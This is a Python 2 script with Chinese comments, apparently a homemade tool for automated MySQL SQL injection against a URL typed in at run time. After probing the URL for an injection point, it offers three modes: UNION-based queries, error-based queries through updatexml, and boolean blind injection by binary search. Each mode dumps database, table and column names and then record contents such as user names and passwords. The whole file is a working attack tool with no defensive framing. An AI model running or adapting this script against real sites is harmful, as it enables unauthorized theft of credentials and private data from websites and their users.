# coding=utf8
import urllib
import string
import requests
import re
import sys

reload(sys)
sys.setdefaultencoding("utf-8")
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:65.0) Gecko/20100101 Firefox/65.0'}


# 定义注入检测类
class injectTest():
    def __init__(self, url=''):
        self.url = url  # 待检测网址,默认为空
        self.a = '%20and%201=1'  # 检测语句 正确
        self.b = '%20and%201=2'  # 检测语句 错误

    # 检测网址
    def judgeUrl(self):
        page = urllib.urlopen(self.url).read()
        pagea = urllib.urlopen(self.url + self.a).read()
        pageb = urllib.urlopen(self.url + self.b).read()
        if page == pagea and page != pageb:
            print '网址', self.url, '可能存在注入点!'
            return True
        else:
            print '网址:', self.url, '不存在注入点!'
            #return False
            exit()

    # 检测数据库的版本
    def judgeVersion(self):
        page = urllib.urlopen(self.url).read()
        sql = string.join([self.url, "%20and%20mid(version(),1,1)=523%"], '')
        pagex = urllib.urlopen(self.url).read()
        if page == pagex:
            print 'MYSQL版本:>5'
        else:
            print 'MYSQL版本<5'

    # 查询显示位有几位
    def display(self):
        display = self.url
     
        for i in range(1, 20):
            pay = str(" order by " + str(i))
            res = requests.get(display)
            res1 = requests.get(display + pay)
            if len(res.content) != len(res1.content):
                print '如果使用联合查询方法，当前表一共有', i - 1, '列'
                break

# 定义mysql注入联合查询方法类
class mysqlInject():
    def __init__(self, url):
        self.db = 'database()'
        self.url = url  # 待检测的网址
        self.title = [0]


    # 爆出当前数据库名
    def injectdatabase(self):
        sql = self.url + '%20and%201=2%20UNION%20SELECT%20' + '1,2,' + self.db + ',4,5,6,7,8,9,10,11,12,13,14,15'

        html = requests.get(sql).content
        # print (html)
        title = re.findall(r'<th height="40" style="color:#FFF"">(.*?)&nbsp;</th>', html)
        print '当前使用的数据库：', title

    # 爆出当前使用的数据表名
    def injecttable(self):

        sql_table = self.url + '%20and%201=2%20UNION%20SELECT%20' + '1,2,' + 'unhex(hex(group_concat(table_name)))' + ',4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database()'
        html = requests.get(sql_table).content
        self.title = re.findall(r'<th height="40" style="color:#FFF"">(.*?)&nbsp;</th>', html)
        self.title = self.title[0]
        self.tableNameList = self.title.split(",")
        print '当前使用的数据表：', self.title

    # 爆出某数据表中信息
    def injecttablename(self):
        while True:

            tablename = raw_input("请输入将要注入的表名:\n")

            if tablename in self.tableNameList:
                break

        sql_tablename = self.url + '%20and%201=2%20UNION%20SELECT%20' + '1,2,' + 'unhex(hex(group_concat(column_name)))' + ',4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.columns where table_name=' + '"' + tablename + '"'
        html = requests.get(sql_tablename).content
        # print html
        title = re.findall(r'<th height="40" style="color:#FFF"">(.*?)&nbsp;</th>', html)

        print '当前表中字段名：', title

        name = raw_input("请输入将要注入的字段名1:\n")
        password = raw_input("请输入将要注入的字段名2:\n")

        data = self.url + '%20and%201=2%20UNION%20SELECT%201,2,group_concat(' + name + '),4,5,6,7,8,9,10,group_concat(' + password + '),12,13,14,15%20from%20' + tablename

        html1 = requests.get(data).content
        # print html1
        
        #抓取页面返回值
        title1 = re.findall(r'<th height="40" style="color:#FFF"">(.*?)&nbsp;</th>', html1)
        title2 = re.findall(r'<td align="left" class="white">(.*?)&nbsp;</td>', html1)

        print '敏感信息1：', title1
        print '敏感信息2：', title2

# 定义mysql报错注入方法类
class errorInject():


    def __init__(self, url):
        self.db = 'database()'
        self.url = url
        #self.error_tablename =""
        

    # 爆出当前数据库版本号,查看是否可以使用报错注入
    def injectdata(self):
        # data1=raw_input("请输入报错信息:\n")
        sql_error = self.url + '%20and%20Updatexml(1,concat(0x7e,(select%20group_concat(version())),0x7e),1)'
        r = requests.get(sql_error)
        h = r.content.decode('utf-8')
        res = re.findall(r'XPATH syntax error: (.*)', h)
        print '当前版本号：', res[0]

    # 爆出当前使用的用户
    def injectdata_dbname(self):
        sql_error1 = self.url + '%20and%20Updatexml(1,concat(0x7e,(select%20group_concat(user())),0x7e),1)'
        r1 = requests.get(sql_error1)
        h1 = r1.content.decode('utf-8')
        res1 = re.findall(r'XPATH syntax error: (.*)', h1)
        print '当前数据库用户名:', res1[0]

    # 爆出当前使用的数据库
    def injectdata_db(self):
        sql_error2 = self.url + '%20and%20Updatexml(1,concat(0x7e,(select%20group_concat('+ self.db +')),0x7e),1)'
        r2 = requests.get(sql_error2)
        h2 = r2.content.decode('utf-8')
        res2 = re.findall(r'XPATH syntax error: (.*)', h2)
        print '当前数据库名：', res2[0]

    # 爆出数据库中所有的表
    def injectdata_table(self):
        sql_error_a = self.url + '%20and%20Updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,30) from information_schema.tables where table_schema=database()),0x7e),1)'
        r_a = requests.get(sql_error_a)
        h_a = r_a.content.decode('utf-8')
        res_a = re.findall(r'XPATH syntax error: (.*)', h_a)

        sql_error_b = self.url + '%20and%20Updatexml(1,concat(0x7e,(select substr(group_concat(table_name),31,61) from information_schema.tables where table_schema=database()),0x7e),1)'
        r_b = requests.get(sql_error_b)
        h_b = r_b.content.decode('utf-8')
        res_b = re.findall(r'XPATH syntax error: (.*)', h_b)

        sql_error_c = self.url + '%20and%20Updatexml(1,concat(0x7e,(select substr(group_concat(table_name),62,92) from information_schema.tables where table_schema=database()),0x7e),1)'
        r_c = requests.get(sql_error_c)
        h_c = r_c.content.decode('utf-8')
        res_c = re.findall(r'XPATH syntax error: (.*)', h_c)

        print '当前使用的表：%s' % (res_a[0] + res_b[0] + res_c[0]).replace("~", "").replace("'", "").replace(" ", "")

    # 爆出字段名
    def injectdata_field(self):
        #爆出所有列
        self.error_tablename = raw_input("请输入将要注入的表名:\n")

        sql_error_table_a = self.url + '%20and%20Updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,30) from information_schema.columns where table_name=' + '"' + self.error_tablename + '"' + '),0x7e),1)'
        r_table_a = requests.get(sql_error_table_a)
        h_table_a = r_table_a.content.decode('utf-8')
        res_table_a = re.findall(r'XPATH syntax error: (.*)', h_table_a)

        sql_error_table_b = self.url + '%20and%20Updatexml(1,concat(0x7e,(select substr(group_concat(column_name),31,61) from information_schema.columns where table_name=' + '"' + self.error_tablename + '"' + '),0x7e),1)'
        r_table_b = requests.get(sql_error_table_b)
        h_table_b = r_table_b.content.decode('utf-8')
        res_table_b = re.findall(r'XPATH syntax error: (.*)', h_table_b)

        sql_error_table_c = self.url + '%20and%20Updatexml(1,concat(0x7e,(select substr(group_concat(column_name),62,90) from information_schema.columns where table_name=' + '"' + self.error_tablename + '"' + '),0x7e),1)'
        r_table_c = requests.get(sql_error_table_c)
        h_table_c = r_table_c.content.decode('utf-8')
        res_table_c = re.findall(r'XPATH syntax error: (.*)', h_table_c)

        print '当前列名：%s' % (res_table_a[0]+res_table_b[0]+res_table_c[0]).replace("~", "").replace("'", "").replace(" ", "")

        #爆出字段中数据
    def injectdata_a(self):
        error_name_a = raw_input("请输入将要注入的字段名:\n")
        error_data_a = self.url + '%20and%20Updatexml(1,concat(0x7e,(select substr(group_concat('+ error_name_a +'),1,30) from '+ self.error_tablename +'),0x7e),1)'
        error_data_b = self.url + '%20and%20Updatexml(1,concat(0x7e,(select substr(group_concat(' + error_name_a + '),31,61) from ' + self.error_tablename + '),0x7e),1)'

        html_error_a = requests.get(error_data_a).content
        html_error_b = requests.get(error_data_b).content
        
        error_title1 = re.findall(r'XPATH syntax error: (.*)', html_error_a)
        error_title2 = re.findall(r'XPATH syntax error: (.*)', html_error_b)

        print '当前表中数据：%s' % (error_title1[0]+error_title2[0]).replace("~", "").replace("'", "").replace(" ", "")

    #添加判断
    def injectdata_b(self):
        error_name_b = raw_input("请输入将要注入的字段名:\n")
        error_data1_a = self.url + '%20and%20Updatexml(1,concat(0x7e,(select substr(group_concat(' + error_name_b + '),1,30) from ' + self.error_tablename + '),0x7e),1)'
        error_data2_b = self.url + '%20and%20Updatexml(1,concat(0x7e,(select substr(group_concat(' + error_name_b + '),31,61) from ' + self.error_tablename + '),0x7e),1)'

        html_error1_a = requests.get(error_data1_a).content
        html_error2_b = requests.get(error_data2_b).content

        error_title1_a = re.findall(r'XPATH syntax error: (.*)', html_error1_a)
        error_title2_b = re.findall(r'XPATH syntax error: (.*)', html_error2_b)

        print '当前表中数据：%s' % (error_title1_a[0]+error_title2_b[0]).replace("~", "").replace("'", "").replace(" ", "")

#定义mysql盲注方法类
class Info(object):

    def __init__(self, url=''):
        self.url = url  # 待检测网址,默认为空
        self.a = '%20and%201=1'  # 检测语句 正确
        self.b = '%20and%201=2'  # 检测语句 错误
        self.url = url
        self.rightLen = len(requests.get(self.url+self.a).content)    #正确界面返回长度
        self.errorLen = len(requests.get(self.url+self.b).content)    #错误界面返回长度
        self.tableLenList = []
        self.tableNameList = []
        self.tableNumber = 0
        self.columnLenList = []
        self.columnNameList = []
        self.tableRecordContext = []
        self.tableColumnNum = 0
        self.tableRecordNum = 0

    #定义二分法(payload,MinNum,MaxNum)
    def useDichotomy(self, payload, MinNum, MaxNum):

        if MaxNum - MinNum <= 1:

            return MaxNum

        ThisNum = MinNum + (MaxNum - MinNum)//2

        if len(requests.get(self.url+payload+str(ThisNum)).content) == self.rightLen:

            return self.useDichotomy(payload, ThisNum, MaxNum)

        else:

            return self.useDichotomy(payload, MinNum, ThisNum)

    def getTableNum(self):

        payload = "%20and%20(select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=database())>"

        self.tableNumber = self.useDichotomy(payload,1,50)

        print '当前数据库中有',self.tableNumber,'个表'

    #当前库中所有表的长度
    def getTableLen(self):

        for i in range(self.tableNumber):

            payload = "%20and%20length((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%20"+str(i)+",1))%20>"

            self.tableLenList.append(self.useDichotomy(payload,1,20))

        #print '当前所有表的长度',self.tableLenList

    #当前库中所有表的名字
    def getTableName(self):

        print '当前库中表的名字：'
        for i in range(self.tableNumber):

            tableName = ""

            for j in range(1,self.tableLenList[i]+1):

                payload = "%20and%20ascii(substr((select%20%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%20"+ str(i) +",1),"+ str(j) +",1))>"

                tableName += chr(self.useDichotomy(payload,30,128))

            self.tableNameList.append(tableName)

            print tableName

    #输入表名，显示表中字段个数
    def getColumnNum(self):

        self.bool_tablename = raw_input("请输入将要注入的表名:\n")

        payload = "%20and%20(select%20count(*)%20from%20information_schema.columns%20where%20table_schema='cms'%20and%20table_name='" + self.bool_tablename + "')>"

        self.tableColumnNum = self.useDichotomy(payload,1,50)

        #print '当前表中有：',self.tableColumnNum,'列'

    #显示表中每个字段的长度
    def getColumnLen(self):

        for i in range(self.tableColumnNum):

            payload = "%20and%20length((select%20column_name%20from%20information_schema.columns%20where%20table_schema='cms'%20and%20table_name='"+ self.bool_tablename +"'%20limit%20"+ str(i) +",1))>"

            self.columnLenList.append(self.useDichotomy(payload,1,20))

        #print self.bool_tablename,'表中所有字段的长度：',self.columnLenList

    #显示表中列的名字
    def getColumnName(self):

        for i in range(self.tableColumnNum):
            self.columnName = ''
            for j in range(1,self.columnLenList[i]+1):

                payload = "%20and%20ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name='"+ self.bool_tablename +"'%20limit%20"+str(i)+",1),"+str(j)+",1))>"

                self.columnName += chr(self.useDichotomy(payload,30,128))

            self.columnNameList.append(self.columnName)

        print '当前表中列名：',self.columnNameList

    #显示表中的数据
    def getTableContext(self):

        #判断表中有多少行数据
        payload = "%20and%20(select%20count(*)%20from%20" + self.bool_tablename + ")>"

        self.tableRecordNum = self.useDichotomy(payload,0,100)

        for i in range(self.tableRecordNum):

            recordContext = ""

            #j循环列
            for j in self.columnNameList:

                recordContext += '|'

                payload = "%20and%20length((select%20"+ j +"%20from%20"+ self.bool_tablename +"%20order%20by%20"+ self.columnNameList[0] +"%20limit%20" + str(i) + ",1))>"

                RecordLen = self.useDichotomy(payload,0,20)

                #print RecordLen

                for k in range(1,RecordLen+1):

                    payload = "%20and%20ascii(substr((select%20"+ j +"%20from%20" + self.bool_tablename + "%20order%20by%20"+ self.columnNameList[0] +"%20limit%20"+ str(i) +",1)," + str(k) + ",1))>"

                    recordContext += chr(self.useDichotomy(payload,30,128))

            print self.bool_tablename,'表中的值：',recordContext + '|'

if __name__ == '__main__':

    url = raw_input("请输入检测网址:\n")
    judge = injectTest(url=url)
    judge.judgeUrl()
    judge.judgeVersion()
    judge.display()
    input_string = raw_input("请输入以下操作选项：\n 1、联合查询注入 2、报错注入 3、布尔盲注 0、退出程序 \n")

    if input_string == '1':
        jc = mysqlInject(url)
        jc.injectdatabase()
        jc.injecttable()
        jc.injecttablename()

    elif input_string == '2':

        jud = errorInject(url)
        jud.injectdata()
        jud.injectdata_dbname()
        jud.injectdata_db()
        jud.injectdata_table()
        jud.injectdata_field()
        jud.injectdata_a()
        jud.injectdata_b()
    elif input_string == '3':

        newobj = Info(url)
        newobj.getTableNum()
        newobj.getTableLen()
        newobj.getTableName()
        newobj.getColumnNum()
        newobj.getColumnLen()
        newobj.getColumnName()
        newobj.getTableContext()

    elif input_string == '0':
        print '程序已退出'
